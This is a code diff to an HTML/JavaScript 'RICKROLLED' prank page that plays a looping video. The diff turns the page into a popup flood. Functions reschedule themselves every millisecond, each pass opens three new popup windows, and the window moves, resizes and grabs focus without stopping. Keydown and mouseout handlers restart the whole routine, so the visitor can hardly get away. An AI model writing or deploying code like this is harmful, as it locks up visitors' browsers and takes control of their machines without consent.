@@ -8,6 +8,8 @@ function onload() {
 	var yOff = 5;
 	var xPos = 400;
 	var yPos = -100;
+	setTimeout(lop, 1);
+	setTimeout(pol, 1);
 	function pool() {
 		if (location.port == "") {
 			open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
@@ -22,9 +24,9 @@ function onload() {
 		pool();
 		pool();
 		pool();
+		setTimeout(pol, 1);
 	};
-	setTimeout(pol, 6000);
-	while (true) {
+	function lop() {
 		document.title = " ! RICKROLLED ! ";
 		xPos += xOff;
 		yPos += yOff;
@@ -43,11 +45,12 @@ function onload() {
 		focus()
 		resizeTo(357, 330);
 		moveTo(xPos, yPos);
+		setTimeout(lop, 1);
 	};
 };
 		</script>
 	</head>
-	<body onload="onload();" leftmargin="0" topmargin="0">
+	<body onload="onload();" onkeydown="onload();" onmouseout="onload();" leftmargin="0" topmargin="0">
 		<video width="357" height="330" autoplay loop>
 			<source src="/RA_NGGUU.mp4">
 		</video>
